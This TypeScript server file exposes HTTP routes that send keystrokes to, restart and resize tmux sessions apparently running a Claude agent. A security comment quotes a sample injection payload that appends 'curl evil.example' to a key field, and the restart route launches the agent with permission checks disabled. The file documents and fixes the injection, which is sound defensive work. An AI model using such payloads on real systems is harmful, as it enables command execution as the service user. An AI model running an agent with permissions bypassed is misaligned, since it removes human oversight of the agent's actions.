import { Hono } from "hono";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { execAsync, resolveTargetSession, sendToTmux, tmuxSessionExists, TMUX_SESSION } from "../utils.js";
import { getTracer } from "../../lib/otel.js";
import { SpanStatusCode } from "@opentelemetry/api";

const execFileAsync = promisify(execFile);

const tmuxTracer = getTracer('cpc-server-tmux');

async function tracedTmux<T>(
  spanName: string,
  session: string,
  commandType: string,
  fn: () => Promise<T>
): Promise<T> {
  const span = tmuxTracer.startSpan(spanName, {
    attributes: { 'tmux.session': session, 'tmux.command_type': commandType },
  });
  try {
    return await fn();
  } catch (err) {
    span.recordException(err instanceof Error ? err : String(err));
    span.setStatus({ code: SpanStatusCode.ERROR });
    throw err;
  } finally {
    span.end();
  }
}

const app = new Hono();

/**
 * Allowlist regex for raw tmux key tokens. A raw `send-keys` call accepts
 * things like `Escape`, `BTab`, `Up`, `Down`, `C-a`, `M-Left`, `S-F1` — all
 * of which fit `^[A-Za-z][A-Za-z0-9_-]*$`. Anything else (shell metachars,
 * whitespace other than the single-space token separator, semicolons, backticks,
 * subshells, etc.) is rejected with 400.
 *
 * Space-separated multi-key strings are allowed (tmux supports
 * `send-keys Escape Up Up`) but each token must independently match. The split
 * happens on `\s+` so the shell can never see a metachar.
 *
 * Security rationale: the previous implementation wired `body.keys` directly
 * into `tmux send-keys -t <session> <keys>` via `exec()`, which spawns
 * `/bin/sh -c` and interprets the whole string as a shell command. A POST
 * containing `{"raw":true,"keys":"Escape; curl evil.example"}` would execute
 * the curl as the `claude` user. The new implementation routes through
 * `execFile` with an argv array (no shell) AND enforces the token allowlist
 * so even a future regression in execFile cannot leak shell metacharacters to
 * tmux's own key parser.
 */
const RAW_KEY_TOKEN = /^[A-Za-z][A-Za-z0-9_-]*$/;

/**
 * Resolve the optional `session` body field shared by the restricted
 * command palette endpoints (send-keys / compact / reload-plugins — the
 * fixed verb set Liam wants usable against ANY fleet session, voice msg
 * 1188). Returns the validated target session name, or a Response already
 * sent to the client (400 bad name / 404 unknown session).
 *
 * The default session skips the existence probe on purpose — legacy
 * behavior lets commands race a /restart-session recreate, and tmux's own
 * error still surfaces as a 500 if it's truly gone. A client-picked
 * session, by contrast, must exist before we send keys anywhere near it.
 *
 * NOT wired into /restart-session or /resize-terminal: those stay
 * default-session-only by design (restart recreates the orchestrator
 * launch command; resize has the window-size latch side effect) — the
 * palette never offers them for other sessions.
 */
async function resolvePaletteTarget(c: any, body: any): Promise<{ session: string } | { response: Response }> {
  const target = resolveTargetSession(body?.session);
  if (!target.ok) {
    return { response: c.json({ ok: false, error: target.error }, 400) };
  }
  if (target.session !== TMUX_SESSION && !(await tmuxSessionExists(target.session))) {
    return { response: c.json({ ok: false, error: "unknown session" }, 404) };
  }
  return { session: target.session };
}

app.post("/send-keys", async (c) => {
  try {
    const body = await c.req.json();
    const keys = body.keys;
    if (!keys || typeof keys !== "string") {
      return c.json({ ok: false, error: "keys required" }, 400);
    }
    const resolved = await resolvePaletteTarget(c, body);
    if ("response" in resolved) return resolved.response;
    const session = resolved.session;
    if (body.raw) {
      // Split on whitespace and validate each token against the allowlist.
      // Reject empty-after-split (e.g. all whitespace input) so we never call
      // tmux with zero key args.
      const tokens = keys.split(/\s+/).filter(Boolean);
      if (tokens.length === 0) {
        return c.json({ ok: false, error: "keys required" }, 400);
      }
      for (const tok of tokens) {
        if (!RAW_KEY_TOKEN.test(tok)) {
          return c.json(
            { ok: false, error: `invalid raw key token: ${tok}` },
            400,
          );
        }
      }
      // execFile with argv — no shell, no interpolation. `=` prefix:
      // exact-match session lookup (the target can be client-picked).
      await tracedTmux('tmux.send-keys', session, 'raw', () =>
        execFileAsync("tmux", ["send-keys", "-t", `=${session}:`, ...tokens])
      );
    } else {
      // Literal text — use execFile (no shell) with `-l` and `--` so user
      // input cannot inject via $(...) or backticks. The previous execAsync
      // path spawned /bin/sh -c on an interpolated string; JSON.stringify
      // only quotes for JS, NOT for shells, so `$(...)` and backticks in the
      // keys survived the quote and were executed by sh BEFORE tmux saw them.
      await tracedTmux('tmux.send-keys', session, 'literal', async () => {
        await execFileAsync("tmux", ["send-keys", "-t", `=${session}:`, "-l", "--", keys]);
        await execFileAsync("tmux", ["send-keys", "-t", `=${session}:`, "Enter"]);
      });
    }
    return c.json({ ok: true, action: "send-keys" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/compact", async (c) => {
  try {
    const body = await c.req.json();
    const message = body.message as string;
    if (!message) return c.json({ ok: false, error: "message required" }, 400);
    const resolved = await resolvePaletteTarget(c, body);
    if ("response" in resolved) return resolved.response;
    const session = resolved.session;

    // Fixed-verb doctrine, enforced at the trust boundary (PR #306 R2): the
    // web client assembles the "/compact ..." prefix, but a non-default
    // target must not accept arbitrary text as keystrokes. Deliberately
    // relaxable when phase-2 confirmation-gated steering lands (#241).
    if (session !== TMUX_SESSION && !/^\/compact(\s|$)/.test(message)) {
      return c.json({ ok: false, error: "non-default sessions accept /compact commands only" }, 400);
    }

    // Send via tmux send-keys — execFile (no shell) with -l + -- so the
    // user-provided message cannot inject via $(...) or backticks.
    await tracedTmux('tmux.compact', session, 'compact', async () => {
      await execFileAsync("tmux", ["send-keys", "-t", `=${session}:`, "-l", "--", message]);
      await execFileAsync("tmux", ["send-keys", "-t", `=${session}:`, "Enter"]);
    });
    return c.json({ ok: true, action: "compact" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/reload-plugins", async (c) => {
  try {
    // Body is optional here (legacy clients POST with no body at all).
    const body = await c.req.json().catch(() => ({}));
    const resolved = await resolvePaletteTarget(c, body);
    if ("response" in resolved) return resolved.response;
    const session = resolved.session;
    await tracedTmux('tmux.send-keys', session, 'reload-plugins', () =>
      sendToTmux("/reload-plugins", session)
    );
    return c.json({ ok: true, action: "reload-plugins" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/restart-session", async (c) => {
  try {
    await tracedTmux('tmux.restart-session', TMUX_SESSION, 'restart-session', async () => {
      // Kill existing tmux session, then recreate using the same command as the cw alias
      await execAsync(`tmux kill-session -t ${TMUX_SESSION} 2>/dev/null || true`, { shell: "/bin/bash" });
      // Match the cw alias exactly: tmux new-session with the full claude command
      const cmd = [
        `tmux new-session -d -s ${TMUX_SESSION}`,
        `"cd ~/claudes-world && TZ=America/New_York claude --dangerously-skip-permissions --continue --channels plugin:telegram@claude-plugins-official"`,
      ].join(" ");
      await execAsync(cmd, { shell: "/bin/bash" });
    });
    return c.json({ ok: true, action: "restart-session" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/resize-terminal", async (c) => {
  try {
    await tracedTmux('tmux.resize-terminal', TMUX_SESSION, 'resize-terminal', () =>
      execAsync(`tmux resize-window -t ${TMUX_SESSION} -A`)
    );
    return c.json({ ok: true, action: "resize-terminal" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

export { app as slashCommandsRoute };
